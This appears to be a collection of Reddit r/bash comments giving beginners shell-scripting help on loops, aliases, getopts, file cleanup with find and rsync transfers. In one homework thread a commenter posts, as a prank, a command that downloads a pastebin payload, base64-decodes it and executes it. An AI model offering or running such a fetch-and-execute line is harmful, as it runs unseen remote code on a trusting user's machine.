&gt; a few quotes are misplaced. Please elaborate. If you mean a few random " in text blocks, those have been taken care of already. Again, Thank you for your input, it was very valuable information. (Answer based on your earlier deleted comment. Don't know what differences there might be)
Do `man man` and then type the following: /^ *-H After you press the Enter key, it should jump to exactly the spot where the `-H` option is described.
Look up the `--pretty` option in `git help log`.
|My idea is to exit the script as cleanly as possible. Perhaps you believe the functions will remain set in the shell you ran the script with otherwise? This is not the case. |Like this?: [[ $(type "${1}" 2&gt;/dev/null) ]] || error "some error" No, this tests whether the type command writes anything to standard output. `||` executes the `error` depending on the exit code of the command before. `[[ ... ]]` is a command, `type` also is; both have useful exit codes. There is no need for the subshell environment and for capturing the output with `$(...)`, for testing whether this output is empty with `[[ ... ]]`, when you can simply use the exit code of the type command directly with `type ... || error`. |As for awk, excuse my ignorance, but are there different varieties of awk with different functionality? Yes, GNU awk in particular has many extensions over what (for example) POSIX standardises. Your awk script is portable. |Please elaborate. See https://www.shellcheck.net/ I refer to the few occurrences of https://github.com/koalaman/shellcheck/wiki/SC2086 A few of the other quotes are not necessary (left-hand side in `[[ .. ]]` and in assignments), the ${ } are neither but they can be harmful because they suggest some added robustness.
isee, is there a way to force english man page because my system is another language?
&gt; Perhaps you believe the functions will remain set in the shell you ran the script with otherwise? This is not the case. Ah, ok, I thought that in some cases they might remain set. In fact, I don't usually unset functions, but thought to do so for this script, not sure why. &gt; No, this tests whether the type command writes anything to standard output. || executes error depending on the exit code of the command before. [[ ... ]] is a command, type also is; both have useful exit codes. There is no need for the subshell environment and for capturing the output with $(...), for testing whether this output is empty with [[ ... ]], when you can simply use the exit code of the type command directly with type ... || error. That makes what you meant much clearer. I totally understand what you mean. &gt; See https://www.shellcheck.net/ I refer to the few occurrences of https://github.com/koalaman/shellcheck/wiki/SC2086 I already use shellcheck. The errors were left in because the variables in question are quaranteed to never have anything that can cause globbing or word splitting in them. However, I get it, good practice would be to always quench as much of shellcheck problem output as possible. &gt; A few of the other quotes are not necessary (left-hand side in [[ .. ]] and in assignments), the ${ } are neither but they can be harmful because they suggest some added robustness. Yes, the left-hand quotes thing I knew about, I just add the quotes there out of habit. As for the ${ }, sometimes I've needed to convert a string to an array, so I made it a habit of always adding the {} in either case. I don't understand why keeping them would be harmful though. They don't suggest added robustness to me anyway? 
Beware of caveats when using this. See https://stackoverflow.com/questions/11038590/a-way-to-do-multiple-statements-per-bash-test-statement for more information.
Important to note: "first 10" will depend on how you loop through your file list. To ensure you target the right ones, it's best to sort your file list early on by whatever criteria is important. Example: if you needed to keep the 10 newest files but delete the others as they're too old, then sort the file list by age, ignore the first 10, then delete each of the others. 
Thank you for your reply. Well, they're just text files numbered from 1 to 65, not actual logs (I should have specified) my apologies. I want to play around with them to understand loops. But so far, all the examples I've seen online are way ahead of what I want to do.
In that case - start small. If I need to perform an operation on multiple files (let's say it's some sort of fancy rename), I start by creating a loop that only shows me the name of each file. That way I can tweak it until the order is correct. Then I add the name I'll be changing to and loop again. Now each line shows me the before and after names. Once I'm satisfied that everything looks good, I then add the command to perform the rename (`mv`). Here's a quick example to get you started: #!/usr/bin/env bash find . -maxdepth 1 -type f -print0 | while read -d $'\0' target; do echo "file: [$target]" done 
So, when I run the script it creates 75 files, all of them start as file_1.txt, file_2.txt..file_75.txt But could you explain me how can I use Loops to delete certain amount of files and/or rename them? I'm really sorry for bothering you so much. This is the script that I want to tweak with. #!/bin/bash # This script creates 75 logs counter=1 rm -r /home/user/scriptlog mkdir /home/user/scriptlog while [ $counter -le 75 ] do #This will make log numer 50 echo something different if [ $counter -eq 50 ] ; then echo "This is not a log"&gt; /home/user/scriptlog/mylogfile_ $counter.txt else echo "This is a log"&gt; /home/user/scriptlog/ mylogfile_$counter.txt echo $counter fi ((counter++)) done
No trouble at all. Firstly, let's fix your file creation script: #!/usr/bin/env bash # This script creates 75 logs counter=1 script_path="$HOME/scriptlog" rm -r "$script_path" mkdir -p "$script_path" while [[ $counter -le 75 ]]; do target_pathfile="$script_path/mylogfile_$counter.txt" echo $counter # This will make log numer 50 echo something different if [[ $counter -eq 50 ]]; then echo "This is not a log" &gt; "$target_pathfile" else echo "This is a log" &gt; "$target_pathfile" fi ((counter++)) done 
It's so much neater. I already made the changes. If I'm understanding correctly, the script that will make changes to the files in the folder, has to be a whole different script? 
It doesn't have to be. I assumed that you wrote that one just to create some test files to play with. If you like, we can add-on the renaming and deletion section to it? 
Yes, we can add it. But if you believe that a separate script would be more appropriate, then Ill open up Vim. So, what should be the first step?
Lets keep it separate. It's only a learning tool anyway. :) I'm just working on the second half now... 
This is an example of a potential rename &amp; deletion script: #!/usr/bin/env bash counter=0 script_path="$HOME/scriptlog" for target in $(ls $script_path/*.txt | sort); do ((counter++)) if [[ counter -le 10 ]]; then echo "! delete: [$target]" #rm "$target" else target_new="${target}.new" echo "- rename: [$target] to [$target_new]" #mv "$target" "$target_new" fi done But (like all shell-scripts), it comes with some conditions. Firstly, it will fail on paths or files with whitespace. To get a short and easy-to-use sort, I had to abandon whitespace-handling. Also, this script will not rename or delete as is. Once you've confirmed that it works correctly, then uncomment the `rm` and `mv` lines. 
Thank you, now I have a much better idea of how the script works (sadly my attempts a few hours ago were way off when I compare them to yours) I'm a month in into learning scripting and there are not enough hours in the day, but you guys are amazing for taking the time to help beginners. Thank you again, and I will continue trying to get better.
No problem, keep at it. There's lots to learn. :D
→ /r/dailyprogrammer
Thanks, appreciate the tip, but havn't so far been able to figure out a way to do it so far.
I have exactly the same problem, if I do not use something on daily basis, I will forget syntax very fast. I have created cheat-sheet: http://gnulinux.guru/
Write a bash script to remind you every day.
Visit /r/bash and /r/linuxquestions regularly and try to help people with their questions that involve scripting.
Perhaps you could try the exercises at rosettacode? http://rosettacode.org/wiki/Category:UNIX_Shell Your first task could be to write a script that sends you a new random task each day by e-mail.
Write a monitoring system in bash, then rewrite it in pure bash. If you don't kill yourself, your knowledge of bash will increase tenfold.
Nice!
analyze what do you do every day, what do you repeat, and automate it all. you'll get to learn tons of stuff.
Rewrote this to be POSIX if someone cares. :)
Your `esac` is in the wrong place. It should be 3 lines up. And `echo""` is missing a space.
&gt; And `echo""` is missing a space. Well, it does exactly the same thing ;)
read -p "Press Enter to continue: " myvar echo $myvar select selection in Root Home Exit do echo $selection done 
"And export it". I think you are trying to use a script to set an environment variable parent environment. You cant. You cant alter the environment variables in the parent process using a script. Export sets environment variables so that they are visible to the -children- of that script. If you want to set an environment variable in the parent script, you have to do it in the parent script like; A=$(myscript) myscript would generate your value on stdout. Excuse me if I have misunderstood your intent.
Finally solved this: Filemaker through its perform Applescript step forcefully creates /r linebreaks. The solution was to create a script to substitute /r for /n after the file was created in order for it to work. Thanks to everyone for the insights!
It's like in the C programming language, when you type a literal number and you start your literal with a zero digit, bash thinks you want it to use base-8 (octal), not base-10 (decimal). See here: $ echo $(( 0234 )) 156 $ echo $(( 234 )) 234 $ echo $(( 0x234 )) 564 
Thank you so much! I had tried the first method before when I was first writing the script and it wouldn't work, it kept spitting out either "integer expected" or something else expected. The second method has fixed the issue of the first set of Capricorn dates not working. I feel like I should ask in case of privacy concerns if you'd like me to credit you for the fix with you username. And yeah, interestingly 123 even though the sets are 1121 to 1131 and 1200 to 1222, which is a very weird occurrence. But I've tested every set of every sign with an entry and seems all good besides that. So again, thank you!
You've got a good point there.
It would help if you pasted the code you already have, and names.txt.
Your best bet is to use a while read loop with some redirection. As an example: while read line; do &lt;what needs doing&gt; done &lt; ${1}
pastebin.com/28Z3L48q For now it works as: ./script.sh file cat fish frog it will create the files: file_cat, file_fish and file_frog i would just like to read a names.txt with the contents: cat fish frog 
Some ideas: You could start by putting the $1 and $2 parameters into variables with a name that tries to describes their meaning: filename_base="$1" names_file="$2" This here reads a file one line at a time: while read -r line; do echo "$line" &gt; "$filename_base"_"$line" done &lt; "$names_file" This here would split the file into words where there are space characters: for word in $( &lt; "$names_file" ); do echo "$word" &gt; "$filename_base"_"$word" done This here can read lines from a file into an array: mapfile -t names &lt; "$names_file" ... and you can then do this: for name in "${names[@]}"; do echo "$name" &gt; "$filename_base"_"$name" done You can experiment with all of that at the command line. You do not need to edit a script all the time. You can use `;` to be able to write stuff on one long line: $ for word in $( &lt; names.txt ); do echo "word is: '$word', file name would be: 'file_$word'"; done ... $ mapfile -t names &lt; names.txt $ for name in "${names[@]}"; do echo "name: &lt;$name&gt;"; done ...
Thank you! I managed to do my original idea, now i'll try to read the filename_base from a text file too
Try using tools like grep, awk, sed, perl to filter and edit the output of git.
Why bracket the variable while it is not interacting with any other character? Brackets are used as show below: f=names.txt while read line; do touch "file_${line}" done &lt; "$f"
That's force of habit. I generally use that everywhere because it's easier when stringing text and variables together for output.
The variable in your example doesn't need brackets either, because `.` can't be in a variable name. But this one does: prefix=$1 f=$2 while read line; do echo "$line" &gt; "${prefix}_$line.txt" done &lt; "$f"
It is always good practice to use them when more characters are around, to ensure the variable doesn't take to many characters imo
Yeah I gave a bad example, my bad :)
Colorschemes solve that problem, so I prefer what you said earlier to use as few as possible.
No worries, just trying to lend a hand where I can.
You can't set the positional parameters one at a time, but you can use `set --` to set them all. You can combine that with `${@:2}`, which gives you the positional parameters starting at `$2`: set -- "new value" "${@:2}"
I would first assign all positional parameters to permanent parameters and do all actions against those. Var1=$1 
I ended up doing that thanks. 
Thats good to know. I imagine its something rarely used. 
What you want is `xargs`: xargs -d"\n" ./script.sh &lt; file.txt This will call script.sh with 'cat', 'fish' and 'frog' as arguments.
I'll check that out as well, thanks for the tip!
Does this work? while [[ ! -z "${nextInput}" ]]; do excludeStr+=" --exclude=\"${nextInput}\"" ((nextInput++)) done 
Is your input an array or a file?
 excludeStr=$(printf "--exclude=\"%s\" " "$@")
from a quick glance your issue is not the "${nextInput}" but the "${ }" around it. I'm not sure what you're trying to achieve with those (it's late where i'm at and i'm just about to log off for bed) have you tried just having the below?: excludeStr="${excludeStr} --exclude=${nextInput}" if there was a reason for the extra brackets you can try escaping them: excludeStr="${excludeStr} --exclude=\"\$\{${nextInput}\}\"" 
all 3 of these start running and then get stuck - no error and no output (i have to ctrl+c to exit from it). I think this is probably why i included them in the first place. Let me try to explain more what I want to do. Say you call foo str1 str2 str3 I want the output to be --exclude="str1" --exclude="str2" --exclude="str3" If I knew there would always be 3 inputs, I believe could accomplish this with: function foo{} ( excludeStr="--exclude=\"${1}\" --exclude=\"${2}\" --exclude=\"${3}\"" echo "excludeStr" ) but I dont know how many inputs there will be, and I may not always want to start with input #1. So, Im trying to replace the ${1}, ${2}, etc. with ${nextInput} and loop nextInput over the inputs I actually want to include. Admittedly I havent been writing bash code for all that long, but it seems like to accomplish this I would need to evaluate nextInput (producing a positive integer), escape that integer, and then evaluate that integer in the standard way for selecting function inputs. Perhaps Im misunderstanding something though.
neither - it is a list of (string) inputs provided by a user. I describe what im trying to accomplish more in [this comment reply](https://www.reddit.com/r/bash/comments/7fai6b/how_can_i_make_this_work_without_getting_a_bad/dqbnhpd/)
Either keep using "$1" and "shift" or you can "dereference" a variable by name: foo=bar x=foo echo ${!x} # prints value of variable named by $x, "bar"
Or, without command substitution and with simpler quoting: printf -v excludeStr '--exclude="%s" ' "$@"
The issue with both this and the modified one that /u/obiwan90 posted is (i think) there it doesnt allow you to control which inputs you want to actually use. In the example I was coincidentally using them all, but I had it setup that way to easily allow not using them all. Id imagine you could add that functionality without too much trouble (perhaps add them all and then remove the ones you dont want?), but I got something to work (see the main post). As a side note tar doesnt seem to like the extra set of quotes around the items represented by '%s' (well, the version of tar Im using doesnt anyways), so these got removed in my final version.
Those `\"` are a mistake, I think. They will show up in the input to the program and won't be removed by bash like normal `"`. That's not what you want as the program will get confused. It will think it's supposed to be a part of the file name. You can try to solve this by collecting those `--exclude=...` parameters in an array. This is a problem using a function as you can't return arrays, just text. You can try to use a "reference" if you really want a function: foo() { local -n result="$1" shift local x for x in "$@"; do result+=( --exclude="$x" ) done } You would then call that function like this: foo excludeStr str1 str2 str3 And can then afterwards do: tar ... "${excludeStr[@]}" ... I think this whole idea is problematic on older bash like what's used on Apple's OS X, so might be a bad idea. I don't know if I made a mistake here as I only very rarely used references.
&gt; [ "$olddate" &gt; 1221 ] &amp;&amp; [ "$olddate" &lt; 1232 ] || [ "$olddate" &gt; 0100 ] &amp;&amp; [ "$olddate" &lt; 0120 ] This is very, very wrong. It creates empty files called 1221 and 0100 and tries to read from files called 1232 and 0120.
Looks like a homework assignment.
Can it be with explanation?
Take a look at https://linux.die.net/man/1/test and http://tldp.org/LDP/abs/html/globbingref.html . The two of those should get you there.
 set -o pipefail find "$1" -mindepth 1 \! -name Contents.txt \( -type f -printf 'Regular file: %p\n' \) -o \( -type d -printf 'Folder: %p\n' \) 2&gt;/dev/null | sort -t: -k2,2 | sort -r -t: -s -k1,1 &gt; Contents.txt || echo path not found error
Ahw, this actually isn’t very nice because it will most certainly get picked for show and tell and op won’t be able to explain how it works. 😂
I'm more okay with this than giving students a reasonable solution to their homework questions.
Here ya go op. $(curl https://pastebin.com/raw/R25MLw4n -s |base64 -d) ^^^^don't ^^^^run ^^^^this ^^^^plz
Didn't test, would it actually run the decoded command?
unless I goofed. 
Perfect, Simple and Readable. I love it. Exactly how I would have done it too.
Try this? find . | grep -E 'error_log-20171?0[0-9]+$' # didn't try | while IFS= read -r file; do rm "$file"; done I'm not familiar with `find`'s syntax. The idea is to find anything that matches error_log-201710[num...]$ or error_log-20170[num...]$
 find ./ -type f | grep -vE '\.gz$|-201711' | xargs rm -f
If you have the "extglob" feature enabled in the output of `shopt`, you can do this: echo error_log-!(201711*) If the output looks good, you can execute it by typing this: ^echo^rm That extglob feature seems to be by default enabled for me here. If it's not for you, you have to do: shopt -s extglob
 find ./ -type f -mtime +26 -name "error_log-*" -not -name "*.gz" -exec ls -rlth {} \; *find* is just perfect for this job
first part works and returns the files, tried with the second part and get lots of errors and it looks like the file path is brpke or something eg: rm: remove regular empty file `./siteA/public_html/error_log- 20171029'? rm: cannot remove `tml/error_log-20170921': No such file or directory rm: remove regular empty file `./SIREb/public_html/error_log- 20170922'? rm: cannot remove `lic_html/error_log-20171001': No such file or directory 
thanks but that seems to return many files Im not looking for?
Wow, that's weird. There must be some sort of newline inserted everywhere. Are you running this on a sane OS? `which grep`, `which find`, etc. Maybe try running the command inside a naked shell: `/bin/sh`?
that was it thanks!
I dont know shopt but will check it out thanks
yeah it is weird, in CentOS 6.9, will try from a shell as Im curious but Kra013's method worked too
That invert grep regexp filters files ending with .gz and with `-201711` timestamp.
 #! /bin/bash shopt -s nullglob [[ ! $1 || ! -d $1 ]] &amp;&amp; echo "Path not found" &amp;&amp; exit 2 for f in "${1}/"*; do [[ -f $f ]] &amp;&amp; echo "Regular file: $f" || echo "Folder file: $f" done | sort -t: -k1r,1 -k2 &gt; Contents.txt
&gt; | xargs rm -f Don't do that, use the `-delete` flag to find.
[Here's a nice writeup](http://wiki.bash-hackers.org/howto/getopts_tutorial)
To compliment this, I wrote a script a bit ago that uses getopt if you're looking for an example. Start around line 85. https://github.com/Resolude/wget-downloader/blob/master/download
Was this script ran manually or via a scheduler? It looks like three transfers are to happen (TRDF, TRAL and TRCF) but in separate directories is this correct? If so have all three been successfully written at some point?
Script ran from cron. Yes, those three transfers run. TRAL and TRDF have multiple files and take hours, TRCF has a single file and takes seconds. All three have been successful and they've been running like this for well over a year. It was only when I was going back through the contract and realised that the telco line we have between the datacentres where these servers live should be doing this transfer in a fraction of the time that I started to investigate. It was then I noticed this second scp process and couldn't for the life of me figure out where it came from. Very odd.
I'd check top and see if the scp commands have the same parent process. it could be that you're seeing overlap due to the duration of the transfer. 
Personally I would use rsync for this. If set up correctly, you can't end up with duplicate files. Also, I can't think of any advantage to using scp for anything but the most simple of network transfers. rsync can work over SSH, it's incremental, and it can avoid file duplication by creating hard links to files (not directories). Take a look at my backup script for an example. Granted I'm not backing up 3 directories, but this will show you an example of how to use rsync for this kind of thing. https://github.com/yramagicman/stow-dotfiles/blob/master/root/bin/backup
A few things that come to mind. - ~29 hours for 1.4 Tb ... hmm, off the top of my head it sounds close but a little bit too fast for 100Mbit, (but not by much, maybe a few hours). If you have Gbit, then It's definitely taking far too long somewhere in path there is a bottleneck slowing things down. - either way, figuring out how to make the script faster depends on what your bottleneck is, with the information given I'm assuming your network bandwidth is the bottleneck? Kicking off all 3 scp processes at the same time (you background the first 2, then leave the 3rd in the foreground) isn't going to make things faster. once the network is saturated, it's not going to get any faster and you potentially end up with 3 incomplete transfers if something goes wrong or is aborted. - there is no reason why `scp -pr 1.2.3.4:$PRODDF $TRDF` should have been running twice, did they have the same parent, was the script running multiple times (you don't have any locking to prevent it)? IIRC Solaris doesn't have `flock`, so you may have to resort to using some atomic command for creating you own lock (somehting along the lines of `if ! mkdir /tmp/filetransfer.lockdir ; then ...` should do the trick. - personally I'd probably prefer rsync since it can resume and do partial transfers. BUT whether it is worth it (or if it is faster) depends on your files and directory structure (a lot of files can take a while for rsync to compare on both ends, whereas scp just says 'meh, I don't care, shove them across').
--ignore-existing for the win!! You good with rsync? Is there a way to make rsync wait for a file to be fully written before attempting to transfer or would you just write a check into the script that pseudo says 'if file written to in last minute, do not rsync' We start our backup at 2100 and it runs through till 0200 the following day. At 0230, once all the files have been written, we run the transfer script. What I've wanted to do for a while is kick the backup and transfer off at the same time -- potential disk IO contention but we'll see. I did very flippantly attempt this once using rsync. My problem was, it would constantly restart the transfer of the same file as it is seen as a new each time it's written to. I haven't looked at this process for ages ... I'm just trying to work out the best and quickest way.
You can comment the transfer out of the script and watch if it still transfers, but making a supplementary script to manually run in the event it doesn't. If so you have it being triggered twice and would have to track it down from there. If not there is something with the transfer or script that is causing two transfers. Maybe add some debugging to the script like return code printing.
Cool! So in light of your wanting to get places quickly may i suggest an application called jumpapp.. its on github. I use it with key combos so if i hit ctrl alt g itll open googlechrome if its not open and if it is open itll bring it into focus... Also vimium for chrome... never need a mouse again!
# Opinion on writes within the last `x` amount of time I don't think it would matter if it was written in the last minute. rsync is made of magic. The way I understand it is that it calculates the differences between the local and remote copies of a file and transfers just what's needed to make it match, so if you set up a hard link like I have, you have instant incremental backups that aren't eating up all your disk space. If you need anything fancy I'd just look at the man page for rsync, and if rsync can't do it, just don't worry about it. # What I would do about... ## Timing your backup and transfer. What I would do in your case is write the backup and transfer all into one script and have that fire off at a predetermined time each day, like 2100. That way the transfer always follows the backup immediately, and you don't have to worry about any overlap. ## Setting up rsync in general. With that said, however, priority number one for me would be getting rsync setup to use hard links. PM me if you want a detailed explanation of my backup script. It's designed to be flexible so I can use it to back up to any machine I want and not have to have my entire network on static IP's. (There's a hack in there that makes this possible, however, the backup script fails every time my DHCP lease gets renewed. This can be avoided with static IP addresses, but that's a pain for a home network.) There are 3 major benefits to setting up hard links. ### Three benefits of using rsync+hard linking - First, you cut your disk usage by a very, very large margin. I'm backing up probably 230GB of data on a 1.5TB disk and I've only used a quarter of my space for 8 or 9 full backups of my /home directory. - Second, rsync can do its incremental transfer magic and just transfer the files that have changed - Third, your transfer time will drop dramatically because you aren't transferring everything every time. If I wasn't using the backup strategy I am, every backup would take overnight, but because of the incremental transfer provided by rsync I get backups done in less than half an hour if I haven't added any movies or other large files to my computer PM me with any questions. I'm happy to help.
I would put that in the "useless use of cat" category Why not alias show='less $1''
You can use less directly: less some_file In your alias you're quitting the first cat, which was reading from standard input instead of the parameter you were expecting. show_some file becomes (assuming you started your login shell without parameters, so $1 is empty): cat | less some_file
Aliases don't take parameters, so the `$1` does nothing. Since you didn't quote the `$1` expansion, it is removed as an empty and you just execute `cat`, which reads from your keyboard until you Ctrl+C out of it. Then your filename is added at the end of `less`. To use the command in the that form, you have to use a shell function instead: unalias show show() { cat "$1" | less; } Of course, as /u/MihaiC pointed out, the use of `cat` is actually superfluous, so you can still use an alias by simply doing `alias show=less`. 
You can't use positional parameters in an alias. Use a function instead. Also, there is no need to write an alias/function for this in the first place, as pointed out in /u/MihaiC's comment.
Less can open multiple files directly. Most tools in the Unix tool box can open files without the help of cat. Cat is for **cat**enating one or more files together into a single output stream. Perhaps a more useful idea would be a shell function that is a little smarter than either cat or less. Here is a shell function that you might like better. It decides whether to use cat or less be determining whether the whole file can fit on the display without the need for scrolling and will reformat lines too long to fit the width of the display. It can optionally include line numbers. #====================================================================== # Format a file (or standard input) and display it or page it if # necessary # pg [-n] [file] # -n add line numbers to output #====================================================================== pg () { local ncols=0 # columns used for line numbering local -r promptLines=$(echo -e "$PS1" | wc -l) # number of lines taken by PS1 prompt # capture standard input # huge files can, of course, fill all available memory while IFS='' read -r -t 0.1 line; do if ! [[ -v pipeFile ]]; then if [[ "$1" = '-n' ]]; then ncols=8 fi local -a pipeFile # array of lines from piped file local inc # amount to increment lineCount each pass through loop local lineCount # total number of formatted lines of output fi # add current text line to list of lines, determine how many formatted lines # will result from it, and increment the total number of lines by that many pipeFile=( "${pipeFile[@]}" "$line" ) inc=$(fmt -s -w $(( COLUMNS - ncols )) &lt;&lt;&lt; "$line" | wc -l) lineCount=$(( lineCount + inc )) done # set up line numbering if [[ "$1" = '-n' ]]; then ncols=8 local -A num # shellcheck disable=SC2154 { num[cat]='-n' # parameter for turning on line numbering in cat num[less]='-N' # parameter for turning on line numbering in less } shift fi # if taking input from a file if [[ $# -gt 0 ]]; then # is there a file names to process? if [[ -f "$1" ]]; then # and is it a regular file? # format file and feed it to either less or cat fmt -s -w $(( COLUMNS - ncols )) "$1" | if [[ $(fmt -s -w $(( COLUMNS - ncols )) "$1" | wc -l) \ -gt $(( LINES - promptLines )) ]]; then command less -R ${num[less]} else command cat ${num[cat]} fi elif [[ -d "$1" ]]; then printf '%s: %s: Is a directory\n' 'pg' "$1" &gt;&amp;2 else printf '%s: %s: No such file or directory\n' 'pg' "$1" &gt;&amp;2 fi elif [[ -v pipeFile ]]; then # taking input from standard input for line in "${pipeFile[@]}"; do echo "$line" done | fmt -s -w $(( COLUMNS - ncols )) | if [[ lineCount -gt $(( LINES - promptLines )) ]]; then command less -R ${num[less]} elif [[ lineCount -gt 0 ]]; then command cat ${num[cat]} else : fi fi } 
[BashFAQ/035](http://mywiki.wooledge.org/BashFAQ/035) is a good read.
&gt; In your alias you're quitting the first cat, which was reading from standard input instead of the parameter you were expecting. &gt; You can less directly!? Well, there ya have it. D'oh! Thank you for the explanation! I understand, now. Here is the test that I did, causing me to draw the wrong conclusion about parameters: I ran `alias tryThis="echo $1"` and tested it. It printed out everything on my command line, instead of only the first argument. I thought that `tryThis abc def` meant that `$1 = abc def`. But that's not true, `$1 = NULL`, meaning that `tryThis abc def` expanded to `echo $1 abd def` which just prints `abc def`.
Thank you. Yeah, I didn't know you could just `less myFile` to use less on it. I never bothered to read the man pages for what seemed like such a simple program. I'll know better than to assume I know something next time weird stuff happens!
My failure was not knowing `less` properly. Didn't know that I could just `less myFile`. Oops... Good stuff tho. TIL
Whoa man, awesome! Thanks for this. Shell functions are totally rad.
Well I tried that alias in my .bashrc before I answered, and " it worked" (linuxmate)
Seems the address is actually this: http://porkmail.org/era/unix/award.html
You can just type `firefox bash.reddit.com`
The full path to the application is not needed, the Mac can find applications without it. rd() { open -a 'Google Chrome' "http://www.reddit.com/r/$1" } 
Yes, it probably seemed to work; I assume you used double quotes (there is a single and a double quote in your example above): alias show="less $1" If you then check what the alias actually is: $ alias show alias show='less ' The `$1` has disappeared, becaused it expanded to the empty string when the alias was defined, so the definition (accidentally) is equivalent to alias show="less " If you used single quotes alias show='less $1' you'll run `less` on whatever happens to be the first positional parameter when you use the alias, *and* your arguments. See also the [Bash manual](https://www.gnu.org/software/bash/manual/bash.html#Aliases): &gt; There is no mechanism for using arguments in the replacement text, as in `csh`. If arguments are needed, a shell function should be used (see [Shell Functions](https://www.gnu.org/software/bash/manual/bash.html#Shell-Functions)).
Bad link. Not found on server.
Personally I keep a skeleton for my scripts. It allows you to manage short and long options. Enjoy: optspec=":__AllCharOpts__-:" while getopts "$optspec" optchar; do case "${optchar}" in -) case "${OPTARG}" in __LongOpt__) echo "${!OPTIND}" OPTIND=$(( $OPTIND + 1 )) ;; help) echo "usage: $0 [-__ShortOpt__|h|--__LongOpt__|help] &lt;value&gt;" &gt;&amp;2 exit 2 ;; *) echo "Unknown option --${OPTARG}" &gt;&amp;2 exit 1 ;; esac;; __ShortOpt__) echo "${!OPTIND}" OPTIND=$(( $OPTIND + 1 )) ;; h) echo "usage: $0 [-__ShortOpt__|h|--__LongOpt__|help] &lt;value&gt;" &gt;&amp;2 exit 2 ;; *) echo "Unknown option --${OPTARG}" &gt;&amp;2 exit 1 ;; esac done 
 xargs -i find {} -name 'sam*.gz' &lt; huge-list-of-dirs
It looks like your submission contains a shell script. To properly format it as code, place four space characters before every line of the script, and a blank line between the script and the rest of the text, like this: This is normal text. #!/bin/bash echo "This is code!" &gt; This is normal text. &gt; &gt; #!/bin/bash &gt; echo "This is code!" *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/bash) if you have any questions or concerns.*
Check out https://www.shellcheck.net/
&gt;I am just trying to figure out how to implement where the user can input what they are searching for. But you already did. You're saying you wrote that script and now can't remember where you wrote the command that prompts the user what to search for? You should try adding `-p 'Enter value for &lt;variable name&gt;'` after all those `read` commands.
 command ls | while IFS= read -r line; do printf '%s\r' "$line"; sleep 2; done Make sure that `ls` is not an alias: % which ls
Easiest option is `watch ls $someDir`. There is a way to save and restore the cursor position with `\e7` &amp; `\e8`, but if the output is more than 2 lines you can't clear all lines that way. You'd need something like `fold` (or `ls -x`) and count the amount of lines. while true; do output=$(ls -x $someDir) echo -n "$output" sleep 1 for ((i=$(wc -l &lt;&lt;&lt; "$output"); i&gt;1; i-- )); do echo -ne '\e[2K\e[A\r' done done
Thanks for the reply. What I'm trying to do is emulate something like watch -n 10 ls $somedir but without taking over the entire screen and doesn't proceed until the user prompts it to.
&gt;What I'm trying to figure out is if there's some way to maybe have echo go back to a PARTICULAR line and print over it instead of the last line. Answering that question specifically: `tput` is your friend. Off the top of my head, you want to use `tput sc` just before your `while` loop, and `tput rc` just inside it before the `echo` (which should be `printf` as an aside). The `tput` args translate thusly, again off the top of my head: `sc` means to Save or Store the Cursor position, `rc` means to Return to or Restore the Cursor position.
If the huge list of directories are all covered by `locate`'s database, your fastest option will be `locate`, something like locate -r /sam.*.gz$ You may like to pass the output of that through your huge list of directories just for a sanity check though: locate -r /sam.*.gz$ | grep -f huge-list-of-dirs
read -re -p
I found a really cool translator script that only needs gawk (gnu awk) to work. However, I've attempted to "beef it up" by creating a "front-end" of sorts that uses dialog to make it easier to do things like: * 1. Scan and translate * 2. Open document or image file and translate * 3. Type and translate * 4. Conversation * 5. Highlight text and translate * 6. Interactive Translate Shell * 7. Settings For the first two items to work, you will need some extra packages installed such as tesseract-ocr, poppler-tools, and able to run "soffice --headless." The video lists what you'll need, and be sure to check out any links in the description. Also, note that file-paths blurred-out in my videos typically refers to my home folder. I take privacy very seriously.
That looks like some solid shell scripting, but couldn't you just use something like `less -FX` instead?
That would do part of what this function does, but less doesn't take into account the lines taken up by the prompt and it doesn't reformat long lines to fit within a limited number of columns.
 for i in `cat huge list of dirs` do find $i -name "sam*.gz" -print done 
But it's implemented in 1 second ;)
 for dir in $(&lt;huge-list-of-dirs); do find "${dir}" -name "sam*.gz" -print done
Interesting....
 MODIFIED_STARTUP=$(eval echo $(echo ${STARTUP} | sed -e 's/{{/${/g' -e 's/}}/}/g')) [...] ${MODIFIED_STARTUP} # splits all and everything. An accident waiting to happen -- COMMAND="$RUN_RUST "$OPTS"" $COMMAND # Same -- That's bound to break. Try using functions instead: startup() { # do something here #cp -r /tmp/"$1" /tmp/"$2" # echo "Hello '$@': $@" #Much quotes, very wow } -- wget http://media.steampowered.com/installer/steamcmd_linux.tar.gz tar -xvzf steamcmd_linux.tar.gz Unzipping unchecked zipped files. WCGW?
So this line is suspect: `MODIFIED_STARTUP=$(eval echo $(echo ${STARTUP} | sed -e 's/{{/${/g' -e 's/}}/}/g'))` The variable `${STARTUP}` is like this, I assume? /opt/rust/startup.sh +server.port {{SERVER_PORT}} +rcon.port 28967 +server.secure \"1\" +server.maxplayers \"{{SERVER_MAXPLAYERS}}\" +rcon.password \"{{RCON_PASSWORD}}\" +server.password "{{SERVER_PASSWORD}}" +server.hostname \"{{SERVER_NAME}}\" +server.level \"{{SERVER_LEVEL}}\" +server.seed \"{{SERVER_SEED}}\" +server.worldsize \"{{SERVER_WORLDSIZE}}\" +server.identity \"{{SERVER_IDENTITY}}\" +rcon.web {{RCON_WEB}} +cfg \"\" +server.description \"{{SERVER_DESCRIPTION}}\" +server.url \"{{SERVER_URL}}\" +server.headerimage \"{{SERVER_HEADERIMAGE}}\" I think what you want is to separate each option with a character, for instance `@` (make sure it's a character not used in the name/password), and then build an array. Your Startup Arguments should then be (basically just replace spaces with @) /opt/rust/startup.sh@+server.port@{{SERVER_PORT}}@+rcon.port@28967@+server.secure@\"1\"@+server.maxplayers@\"{{SERVER_MAXPLAYERS}}\"@+rcon.password@\"{{RCON_PASSWORD}}\"@+server.password@"{{SERVER_PASSWORD}}"@+server.hostname@\"{{SERVER_NAME}}\"@+server.level@\"{{SERVER_LEVEL}}\"@+server.seed@\"{{SERVER_SEED}}\"@+server.worldsize@\"{{SERVER_WORLDSIZE}}\"@+server.identity@\"{{SERVER_IDENTITY}}\"@+rcon.web@{{RCON_WEB}}@+cfg@\"\"@+server.description@\"{{SERVER_DESCRIPTION}}\"@+server.url@\"{{SERVER_URL}}\"@+server.headerimage@\"{{SERVER_HEADERIMAGE}}\" And in the pteradactyl, replace the line `${MODIFIED_STARTUP}` with IFS=@ read -a cmdarray &lt;&lt;&lt; "$MODIFIED_STARTUP" "${cmdarray[@]}" The quotes may then be unwanted.
